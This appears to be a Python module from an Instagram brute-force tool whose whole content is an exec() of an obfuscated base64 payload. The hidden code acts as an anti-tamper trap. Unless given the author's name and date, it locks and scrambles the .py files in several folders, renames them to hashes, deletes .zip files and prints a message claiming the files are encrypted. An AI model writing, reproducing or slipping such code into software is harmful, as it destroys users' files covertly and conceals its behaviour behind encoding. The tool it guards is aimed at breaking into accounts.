import base64
exec(base64.b64decode('aW1wb3J0IG9zLCB6bGliLCBiYXNlNjQsIGhhc2hsaWIsIHN5cywganNvbgoKY2xhc3MgdWxmYWg6CiAgIGRlZiBfX2luaXRfXyhzZWxmKSAtPiBOb25lOgogICAgICAgc2VsZi5sYXN0dXBkYXRlID0gJzIxODIwMjQnCgogICBkZWYgZXhlY3V0ZW93bihzZWxmLCByZWNvZGU9RmFsc2UsIGxhc3R1cGRhdGU9Tm9uZSwgbG9jYXRpb249Tm9uZSkgLT4gYm9vbCB8IE5vbmU6CiAgICAgICBpZiByZWNvZGU6CiAgICAgICAgICBpZiByZWNvZGUubG93ZXIoKSA9PSAna2hhbWRpaGkgZGV2JzoKICAgICAgICAgICAgIGlmIGxhc3R1cGRhdGUgPT0gc2VsZi5sYXN0dXBkYXRlOgogICAgICAgICAgICAgICAgI29wZW4oJy5tYWluJywndycpLndyaXRlKGpzb24uZHVtcHMoeydtYWluJzpUcnVlfSkpCiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgIGVsc2U6IHNlbGYucmVtb3ZlYWNjZXNzKG9zLmxpc3RkaXIoKSwgbG9jYXRpb24pCiAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgc2VsZi5kaXJ6ID0gW10KICAgICAgICAgICAgIHNlbGYucmVzdCA9IG9zLmxpc3RkaXIoJ2RhdGEnKQogICAgICAgICAgICAgc2VsZi5tZXRoID0gb3MubGlzdGRpcignbWV0aG9kJykKICAgICAgICAgICAgIGZvciBzZWxmLmlqayBpbiBzZWxmLm1ldGg6CiAgICAgICAgICAgICAgICAgc2VsZi5hYmNkID0gJ21ldGhvZC8nICsgc2VsZi5pamsKICAgICAgICAgICAgICAgICBzZWxmLmRpcnouYXBwZW5kKCcnLmpvaW4oc2VsZi5hYmNkKSkKICAgICAgICAgICAgIGZvciBzZWxmLmFiZCBpbiBvcy5saXN0ZGlyKCk6CiAgICAgICAgICAgICAgICAgc2VsZi5kaXJ6LmFwcGVuZCgnJy5qb2luKHNlbGYuYWJkKSkKICAgICAgICAgICAgIGZvciBzZWxmLnhoeiBpbiBzZWxmLnJlc3Q6CiAgICAgICAgICAgICAgICAgc2VsZi5sb2N0ID0gJ2RhdGEvJyArIHNlbGYueGh6CiAgICAgICAgICAgICAgICAgc2VsZi5kaXJ6LmFwcGVuZCgnJy5qb2luKHNlbGYubG9jdCkpCiAgICAgICAgICAgICBzZWxmLnJlbW92ZWFjY2VzcyhzZWxmLmRpcnosIGxvY2F0aW9uKQoKICAgZGVmIHJlbW92ZWFjY2VzcyhzZWxmLCBkaXJlY3RvcnksIGxvY2F0aW9uKSAtPiBOb25lOgogICAgICAgZm9yIGkgaW4gKGRpcmVjdG9yeSk6CiAgICAgICAgICAgaWYgJy5weScgaW4gc3RyKGkpOgogICAgICAgICAgICAgICBvcy5zeXN0ZW0oJ2NobW9kIDAwMCAlcyclKGkpKQogICAgICAgICAgICAgICBzZWxmLkVuY29kZWZpbGUoaSkKICAgICAgICAgICBlbGlmICcuemlwJyBpbiBzdHIoaSk6CiAgICAgICAgICAgICAgIG9zLnJlbW92ZShpKQoKICAgICAgIG9zLnN5c3RlbSgnY2xlYXInIGlmICdsaW51eCcgaW4gc3lzLnBsYXRmb3JtLmxvd2VyKCkgZWxzZSAnY2xzJykKICAgICAgIHByaW50KCdcbicpCiAgICAgICBwcmludCgnICAgbWVuY29iYSBtZW5ndWJhaCBkYXRhIGF1dGhvclxuJykKICAgICAgIHByaW50KCdzb3JyeSwga2FtdSB0ZXJkZXRla3NpIG1lbmd1YmFoIHRhbmdnYWwgYXRhdSBuYW1hIGF1dGhvciEnKQogICAgICAgcHJpbnQoJ3NlbXVhIGZpbGUga2FtdSB0ZXJlbmtyaXBzaSBvdG9tYXRpcycpCiAgICAgICBwcmludCgnaGFyYXAgdGlkYWsgbWVtYmFnaWthbiBhdGF1IG1lbmp1YWwgc291cmNlIGNvZGUgaW5pIVxuJykKICAgICAgIHByaW50KCcgICBpbnN0YWdyYW0gYnJ1dGVmb3JjZXMgdjEyLjAnKQoKICAgZGVmIEVuY29kZWZpbGUoc2VsZiwgZmlsZSk6CiAgICAgICB0cnk6CiAgICAgICAgICBzZWxmLnNvdXJjZSA9IG9wZW4oZmlsZSwncicpLnJlYWQoKQogICAgICAgICAgc2VsZi5uYW1hICAgPSBoYXNobGliLm1kNShmaWxlLmVuY29kZSgidXRmLTgiKSkuaGV4ZGlnZXN0KCkKICAgICAgICAgIHNlbGYuZW5rcmlwID0gYmFzZTY0LmI2NGVuY29kZSh6bGliLmNvbXByZXNzKHNlbGYuc291cmNlLmVuY29kZSgndXRmLTgnKSkpLmRlY29kZSgpCiAgICAgICAgICBvcGVuKGZpbGUsJ3cnKS53cml0ZShzZWxmLmVua3JpcCkKICAgICAgICAgIG9zLnN5c3RlbShmJ212IHtmaWxlfSB7c2VsZi5uYW1hfScpCiAgICAgICAgICBvcy5zeXN0ZW0oJ2NobW9kIDAwMCAlcyclKHNlbGYubmFtYSkpCiAgICAgICBleGNlcHQ6cGFzcwo='))
